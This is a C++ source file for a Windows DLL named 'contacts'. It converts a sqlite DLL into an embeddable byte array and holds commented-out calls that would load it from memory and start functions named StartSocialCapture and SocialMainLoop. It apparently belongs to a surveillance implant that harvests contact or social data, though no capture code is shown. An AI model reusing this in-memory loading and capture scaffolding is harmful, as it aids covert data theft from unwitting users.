// contacts.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "contacts.h"
#include "Tools.h"
#include "MemoryModule.h"

// project fix :
/*
*UNICODE - ansi
*预编译头 - no
*link    - Winhttp.lib
*def文件 - H4-DLL.def
*some code -  del or rem(//)
*add some init code 
*debug     -  release  (because the jmp code )

*/ 
//project fix end



CONTACTS_API int ncontacts=0;
void genData()
{
	std::string strInFile = "G:\\dev_code_x\\contacts\\Release\\sqlite.dll";
	std::string strInContent;
	std::string strOutFile = "G:\\dev_code_x\\contacts\\Release\\sqlite.txt";
	std::string strOutContent;
	int i = 0;
	if (ReadBinFile(strInFile, strInContent)){
		for (std::string::iterator it = strInContent.begin(); it != strInContent.end(); it++, i++)
		{
			//strOutContent += "0x";
			// 			char temp[8];
			// 			itoa(*it, temp, 16);
			std::string hexStr = std::to_string(*it);
			strOutContent += hexStr;
			strOutContent += ",";
			if (i > 50)
			{
				i = 0;
				strOutContent += "\n";
			}
		}
	}
	WriteBinFile(strOutFile, strOutContent);
}
extern int sqliteModLen;
extern char sqliteMod[];
CONTACTS_API int test(void)
{
	//genData();
// 	HMEMORYMODULE hMod = MemoryLoadLibrary(sqliteMod, sqliteModLen);
// 	FARPROC pf = MemoryGetProcAddress(hMod, "sqlite3_open");
// 	void Init(const char* dllname, const char* homepath);
// 	std::string strPath = GetAppPathA();
// 	Init("contacts.dll", strPath.substr(0, strPath.length()-1).c_str());
// 	void StartSocialCapture();
// 	StartSocialCapture();
//  	void SocialMainLoop();
//  	SocialMainLoop();
	for (;;)
	{
		Sleep(3000);
	}
	return 0;
}

Ccontacts::Ccontacts()
{
	return;
}